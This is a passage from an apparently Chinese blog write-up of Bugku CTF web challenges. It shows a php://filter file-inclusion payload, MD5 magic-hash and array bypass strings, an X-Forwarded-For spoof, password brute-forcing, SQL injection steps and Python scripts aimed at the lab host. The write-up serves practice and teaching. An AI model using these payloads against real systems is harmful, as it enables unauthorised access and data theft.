<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false       &#x3D;&gt;  ![]</span><br><span class="line">true        &#x3D;&gt;  !![]</span><br><span class="line">undefined   &#x3D;&gt;  [][[]]</span><br><span class="line">NaN         &#x3D;&gt;  +[![]]</span><br><span class="line">0           &#x3D;&gt;  +[]</span><br><span class="line">1           &#x3D;&gt;  +!+[]</span><br><span class="line">2           &#x3D;&gt;  !+[]+!+[]</span><br><span class="line">10          &#x3D;&gt;  +[[+!+[]]+[+[]]]</span><br><span class="line">Array       &#x3D;&gt;  []</span><br><span class="line">Number      &#x3D;&gt;  +[]</span><br><span class="line">String      &#x3D;&gt;  []+[]</span><br><span class="line">Boolean     &#x3D;&gt;  ![]</span><br><span class="line">Function    &#x3D;&gt;  [][&quot;filter&quot;]</span><br><span class="line">run         &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">eval        &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return eval&quot;)()( CODE )</span><br><span class="line">window      &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>
<p>所以我们复制粘贴这串jsfuck到控制台输出，得到结果</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web5/%28JU~1L3FO~6KTRQV886%25%60%40W.png" alt=""></p>
<p>再按题目提示的，转换成大写的形式，提交即可。</p>
</li>
<li>
<h2 id="头等舱"><a class="header-anchor" href="#头等舱">¶</a>头等舱</h2>
<p>进去后，发现确实和页面说的一样，啥信息都没有</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/AJH%28INH1G56374%249K6G%29IWB.png" alt=""></p>
<p>好，我们抓包看看，有没有什么有用的信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/2CWHD%60%25%5BADSG%25H2W%5DYX9H%29Y.png" alt=""></p>
<p>好吧，flag这就出来了。</p>
</li>
<li>
<h2 id="网站被黑"><a class="header-anchor" href="#网站被黑">¶</a>网站被黑</h2>
<p>打开环境，是一个被挂了黑页的网站</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/QQ%E6%88%AA%E5%9B%BE20201018162409.png" alt=""></p>
<p>我们先扫一下页面，看看留下了什么</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/UT~3VV~T72FTBD_PXMF3L68.png" alt=""></p>
<p>发现有一个shell.php，我们去访问一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/I%40OI%250XWBJ%40M5%28X%25QY%286IAC.png" alt=""></p>
<p>发现是一个需要登录的页面，我们使用burpsuite爆破一下密码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/2GRA6H%7BML86%7DW%5DM8R7A8%29SR.png" alt=""></p>
<p>爆破得到密码为hack，输入密码，得到flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/T6Z2%25VF%290%7D%2938%5D%7B%7D9PSS%602F.png" alt=""></p>
</li>
<li>
<h2 id="管理员系统"><a class="header-anchor" href="#管理员系统">¶</a>管理员系统</h2>
<p>打开页面，发现是一个登录框，先查看一下源码，找找有没有什么提示</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/Z8%40230%7BC%7B6V8GOE7D851%291M.png" alt=""></p>
<p>发现一串base64加密的数据，我们去解密看看</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/B9_3MUJUL493G0Y816ECBR1.png" alt=""></p>
<p>猜测这应该是密码，账号的话默认admin试试，毕竟管理员系统嘛</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/0MBMGO20DMNSRR1%29%40%5BD85H0.png" alt=""></p>
<p>发现提示我们ip禁止登陆，应该是要指定ip，本地本地本地…emmm，那是提示我们127.0.0.1吧，试试一波。</p>
<p>加个X-Forwarded-For头进去发一下包</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/NWQJ4%7D9Y_%40I7B8%5B%25COSZ%25%28Y.png" alt=""></p>
<p>发现登陆成功，flag回显出来了，嘿嘿嘿。</p>
</li>
<li>
<h2 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h2>
<p>进来就提示我们查看源代码，不错不错</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web4/~TO%29FETA5%29%254NP4%7D7Z%29%29%60F2.png" alt=""></p>
<p>移步去源代码，发现js里有三串经过url编码的数据</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web4/E%7BUM%24%408%28ZAX3GGX%7D5TXVB%60R.png" alt=""></p>
<p>我们去解码后，把这三串解密的数据拼接起来，这里建议去在线的js格式美化网站进行格式化，然后得到</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web4/XVK%24A9MCZ4K%7BWC%28O09K%29J9F.png" alt=""></p>
<p>我们把这一串字符串“67d709b2baa648cf6e87a7114f1”输入提交框</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web4/%5B%5DT%40%25X0FAPWVTXIR%5DU%5DS%296M.png" alt=""></p>
<p>flag就出来了，但让我有一点点迷惑，按js代码里说应该获取的是id为password里的值，但我们刚刚看源代码，提交框的id是flag…来自菜鸡的迷惑。</p>
</li>
<li>
<h2 id="flag在index里"><a class="header-anchor" href="#flag在index里">¶</a>flag在index里</h2>
<p>打开页面，只有一个链接点击</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/U5%5D7%7B%406A_%2421B%2946Q%5BR%60%4033.png" alt=""></p>
<p>点开连接后显示一个文本，查看了源码发现没有什么信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/%5B%29F%40DM%5B9%409W%7B92XX%29XQFEAD.png" alt=""></p>
<p>注意到url有个file参数，猜一波文件包含。</p>
<p>使用php协议进行读取：file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>先对这个协议进行一波解释：</p>
<blockquote>
<p>file进行get传参，题目前面提示我们的index.php，php://filter/是访问本地文件的协议，read表示要读取的链的筛选列表，resource表示访问的目标文件。</p>
<p>为什么中间要进行一波base64加密呢？因为不进行base64加密，会直接当成php文件执行。而我们传递的参数被include()函数引入了base64的格式，执行不成功，所以会返回文件的源码。</p>
</blockquote>
<p>使用php文件协议后，页面返回一串被base64加密的源码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C5TYJ8CEF%29N%5DM%60%5BNNNC%60W%5B5.png" alt=""></p>
<p>解密base64之后得到</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C_%7DDCAG%5B2RL2BJM%40Z4SN3VI.png" alt=""></p>
<p>发现flag藏在注释中，闯关成功！</p>
</li>
<li>
<h2 id="输入密码查看flag"><a class="header-anchor" href="#输入密码查看flag">¶</a>输入密码查看flag</h2>
<p>进来是一个输入密码的登陆框</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/S%25XM%289XXWB3O%24H%28%7DJEJUA%5D5.png" alt=""></p>
<p>老规矩。按照题目提示，使用burpsuite抓包爆破密码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/_SB%40QY%24%7B3_O3N_ZXVDJU46I.png" alt=""></p>
<p>因为说的5位数字，所以按10000到90000爆破试试</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
<p>去冲杯牛奶先…</p>
<p>ok。爆破成功，查看response，得到flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
</li>
<li>
<h2 id="点击一百万次"><a class="header-anchor" href="#点击一百万次">¶</a>点击一百万次</h2>
<p>好家伙，又是一道链接挂掉的题目，待续…</p>
</li>
<li>
<h2 id="备份是个好习惯"><a class="header-anchor" href="#备份是个好习惯">¶</a>备份是个好习惯</h2>
<p>打开页面是一串字符串，没看懂啥意思</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/NPU2G0NO%29~UHHH%7D%24P%29HJZ2U.png" alt=""></p>
<p>按照题目提示，应该是有备份文件泄露，猜测应该是常见的bak文件，使用工具扫一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/%28~%60BF%7DB_%24MW9P%60I%2827BN2ZN.png" alt=""></p>
<p>发现存在bak文件，我们访问这个路径后，下载bak文件，打开出现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码意思是，对key进行一个过滤，然后传参key1和key2两个参数，同时key1和key2的md5值要相等，并且未经过md5加密前的值不能相等，满足条件就会输出flag。</p>
<p>对于key过滤我们可以考虑使用双写的方法，kkeyey1</p>
<p>这里说一下可以利用==漏洞和数组漏洞绕过md5</p>
<p><strong>==漏洞：</strong></p>
<blockquote>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
</blockquote>
<p><strong>数组漏洞：</strong></p>
<p>md5()函数无法处理数组，如果我们传数组进去，会返回一个NULL，所以两个数组经过加密后得到的都是相同的NULL。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/JE36DTP5PN~GP5EA2POZ%28YI.png" alt=""></p>
<p>ok，成功绕过，取得flag。</p>
</li>
<li>
<h2 id="成绩单"><a class="header-anchor" href="#成绩单">¶</a>成绩单</h2>
<p><strong>手工注入：</strong></p>
<p>根据页面内容，还有输入框的提示1,2,3，猜测应该是sql注入的类型，尝试传参一个1</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3V6%28G84T%29H%5BA_Z_%24%7B%25NG%7BSH.png" alt=""></p>
<p>有回显，再加个’号测试测试</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%29FK7%5DYXUELQ96IWRV_V8%7DML.png" alt=""></p>
<p>发现没有回显，加一个注释试试</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJT40REGPF%7D2%5D19_N_S%25K07.png" alt=""></p>
<p>有数据回显，判定是存在sql注入，我们查查应该有多少列，其实看网页显示的数据，就能看出是4列了，但还是测试一下，免得判断错误</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/Q%28CQDWU%7D%5DFT%60%25%24H8%25AK8B%5BB.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/HX%292DBLC3G%603~%5D%28%5D5KWB%254L.png" alt=""></p>
<p>发现为4时有回显数据，为5时没有数据回显，判断有4列</p>
<p>那我们直接来尝试联合注入，查查数据库名字，这里记得要写成id=-1’，把前面查询的数据置空，当然id=0也是可以的</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/I6M%7DB2QK6WB4MF3ILV_WMRG.png" alt=""></p>
<p>查出数据库的名字为：skctf_flag</p>
<p>继续查表名字</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%28CVZ%7D%5D97KJW5_%40GLWYO_O%24S.png" alt=""></p>
<p>查出有两个表，分别为fl4g和sc，我们先查表为fl4g的列名</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V12W79PWN~1R%25~FUWXJEC%5BF.png" alt=""></p>
<p>得到列名为skctf_flag，下一步查看列里面的数据</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3Z1HO%7BD%40J%5B%24NINEOQ4SWQ7T.png" alt=""></p>
<p>ok，爆出flag了，大功告成！</p>
<p><strong>使用sqlmap工具爆破</strong>：</p>
<p>首先这是个post方式提交的，所以我们需要用burpsuite进行抓取数据包</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/_T9%5DIEYFI%29%7D3B1ULO69CXNK.png" alt=""></p>
<p>然后复制到文本文件上</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V_2IY%7D%295REKL6GRA4AMZFCG.png" alt=""></p>
<p>查询数据库：</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/ZCI8V7QAV3DBW%60%5B%40J8~_BLP.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJB0ITHDT2EF%28H7Y%29%60ADNMG.png" alt=""></p>
<p>查询表名：</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/RA5%29I%7DFT%7BV2S%28L87RD%60AD%40O.png" alt=""></p>
<p>查询字段名：</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/B~%40I%25~2Z52PR1WEJ5YEC5%7DE.png" alt=""></p>
<p>查询字段信息：</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/PSMH%7DE%25MAI~EMU434%7DLDE%5B2.png" alt=""></p>
</li>
<li>
<h2 id="秋名山老司机"><a class="header-anchor" href="#秋名山老司机">¶</a>秋名山老司机</h2>
<p>喂，高桥凉介吗？我是藤原拓海，我想加入…车队。</p>
<p>哈哈，不好意思，走错片场了</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/2NGXH%7DD8~~%24%7BFV9YRG%2826QK.jpg" alt=""></p>
<p>打开页面，是一个很长的计算式子，而且2s内又会发生变化。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/X5_XP_O_%5BCZ%5DL1H1B%7BWIQPV.png" alt=""></p>
<p>翻了一下网页源码也没有什么有用的信息，猜测是需要我们向他发送一个post数据包，数据为式子的计算值，但它没有给出需要传参的对象是什么。而且在2s内计算出值不太可能，这个时候我们需要写一个python脚本跑一跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#因为re.findall返回的是一个列表，所以我们查看一下列表的内容</span></span><br><span class="line">print(<span class="string">&quot;页面的计算式子：&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>先解释一下脚本，用session保持一个会话状态，免得下次post出去的时候就是另一个计算值了，然后用正则匹配页面内容div后面的数字和±*三种运算符，后面的表示匹配全部，?表示非贪婪匹配，用eval计算我们的式子。</p>
<p>首先我们给一个空的对象传计算的值测试测试，因为我们也不知道给谁传值</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/J%5D8U%28%5BUYQ9CQO95MUC%28FXRX.png" alt=""></p>
<p>返回页面结果，提示我们给value传值，ok，那我们在字典上再填上value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#因为re.findall返回的是一个列表，所以我们查看一下列表的内容</span></span><br><span class="line">print(<span class="string">&quot;页面的计算式子：&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;value&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>看看结果</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/4JCI7%255O%60Q849KFX9M9%24V_B.png" alt=""></p>
<p>拿到flag，下一关下一关！！！</p>
</li>
<li>
<h2 id="速度要快"><a class="header-anchor" href="#速度要快">¶</a>速度要快</h2>
<p>打开页面</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/8%40T~%7B%7D%607N0E4JJ%29JV%24K%40SWT.png" alt=""></p>
<p>让我们快点，好，那我就用burpsuite搞一下你</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%29EHX4V~L3USH7W%5B4%606%40M_WX.png" alt=""></p>
<p>发现响应头有flag，flag后面数据被base64加密了，我们去解决一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/G%40K%28U69GOE7I7X%60U2%7DZX6ZJ.jpg" alt=""></p>
<p>好家伙，还有一串base64加密的数据，那我们再解一遍</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/P%24O581JD%5BGRO%7B%7B%24VPO6Y9RH.jpg" alt=""></p>
<p>题目提示我们flag的格式，所以我们去按照格式提交一下</p>
<p>…emm答案不正确</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/MOJS0I82%60U3GCO7%7BC%29O%7D4GA.jpg" alt=""></p>
<p>后面发现每次提交一次包，返回的flag都不一样</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%7D%7DI~3MYXK%40AK%40L71HFANWR4.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/N9PFS22WWSK9~VW_2F_%409WP.jpg" alt=""></p>
<p>被演了一手，注意到返回的数据提示我们需要post发送margin，应该是发送数据margin:解密后的flag。但再次发送后还是回显“我感觉你得快点”</p>
<p>那我直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web6/&#x27;</span></span><br><span class="line">se = requests.session()</span><br><span class="line">flag = se.get(url).headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag = base64.b64decode(flag).decode()<span class="comment">#多加个decode(),是因为上一步生成的是bytes类型，要转换成string</span></span><br><span class="line">flag = base64.b64decode(flag.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]) </span><br><span class="line">go = &#123;<span class="string">&#x27;margin&#x27;</span>:flag&#125;</span><br><span class="line">print(se.post(url,data=go).text)</span><br></pre></td></tr></table></figure>
<p>然后得到flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/O1%24UM%29LIER5PAGC7OFY%29_TN.png" alt=""></p>
<p>还是解释一波脚本吧，首先使用session保持一个会话状态，然后得到返回的响应头中的flag那一条数据。经过第一次base64解密，然后取解密出来的那一串字符串中的‘：’后面的那一串base64加密的数据进行解密，最后发送一个post数据包，打印出文本信息。</p>
</li>
<li>
<h2 id="cookies欺骗"><a class="header-anchor" href="#cookies欺骗">¶</a>cookies欺骗</h2>
<p>打开页面，是一大串没有用的字符串(因为尝试解密了N次…)</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>有注意到filename参数后面跟的是一串base64编码，去解密一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>解密得到keys.txt，应该这是个突破点，访问一下index.php，注意要先进行base64编码，按照它的方式传参。</p>
<p>index.php经过base64编码后为：aW5kZXgucGhw</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/PAAJKTHIOF1TTDZHYHWDZ%7BV.png" alt=""></p>
<p>在源代码中发现有点有用的信息，这时候把视线再转移到另一个参数line。前面只显示&lt;?php，并不全，猜测可能是line控制显示的行数</p>
<p>我们尝试更改line的值</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/FQ%5B4IHZ%5BWK82R5C%29FQFGKQ9.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/88L4Y%7D0_M%28WV~LM%7BE%2968F%25I.png" alt=""></p>
<p>确认line参数控制显示的行数了，我们写个python脚本跑一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">lines = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lines):</span><br><span class="line">    url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>+str(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    res = requests.get(url).text</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
<p>跑完得到完整的源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">	$fa = file($file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看来需要传参cookie，并且margin=margin才能访问keys.php文件</p>
<p>keys.php经过base64编码为：a2V5cy5waHA=</p>
<p>我们发送一下包</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/2~FY~%5BQJ0HS%5B~JJTVR4F%5BDU.png" alt=""></p>
<p>在源码中找到flag啦~</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/06ITHFL5I%5D%24GG%7B%7BQZIQ%254TU.png" alt=""></p>
</li>
<li>
<h2 id="never-give-up"><a class="header-anchor" href="#never-give-up">¶</a>never give up</h2>
<p>打开页面告诉我们不要放弃</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/RN9TL~G5NVGREJ2P1~4SW_T.png" alt=""></p>
<p>查看一下源码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/8TN%7BV%40S90DH0UP%25JC%5BPH%40%5B1.png" alt=""></p>
<p>提示我们有1p.html文件，我们去访问一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/D9P%290%2482%60R9_Z99FV%24UC3JN.png" alt=""></p>
<p>发现我们被重定向到https://www.bugku.com/</p>
<p>用view-source查看一下源码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/BU%5BB1%29%7DJEE6AUKVTM%255%5DQZ6.png" alt=""></p>
<p>看见Words用经过了url编码，去解密一下</p>
